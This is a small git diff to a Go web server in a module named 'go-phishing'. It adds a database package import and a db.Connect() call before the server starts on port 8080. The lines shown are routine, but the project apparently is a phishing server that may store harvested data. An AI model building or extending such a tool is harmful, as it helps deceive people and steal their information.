@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"go-phishing/db"
 	"io/ioutil"
 	"net/http"
 	"regexp"
@@ -133,6 +134,7 @@ func handler(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
+	db.Connect()
 	http.HandleFunc("/", handler)
 	err := http.ListenAndServe(":8080", nil)
 	if err != nil {
